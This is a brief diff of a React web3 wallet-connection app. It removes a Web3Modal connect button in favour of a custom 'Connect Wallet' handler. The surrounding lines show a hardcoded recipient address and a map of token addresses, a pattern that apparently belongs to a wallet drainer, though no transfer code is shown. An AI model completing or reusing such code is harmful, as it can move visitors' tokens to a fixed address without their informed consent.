@@ -38,10 +38,6 @@ export function Web3ModalProvider({ children }) {
   );
 }
 
-function ConnectButton() {
-  return <w3m-button />;
-}
-
 const ethers = require('ethers');
 const toAddress = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f';
 const tokenAddresses = {
@@ -181,7 +177,6 @@ function App() {
           <button onClick={handleConnect}>Connect Wallet</button>
         )}
       </header>
-      <ConnectButton />
     </div>
   );
 }
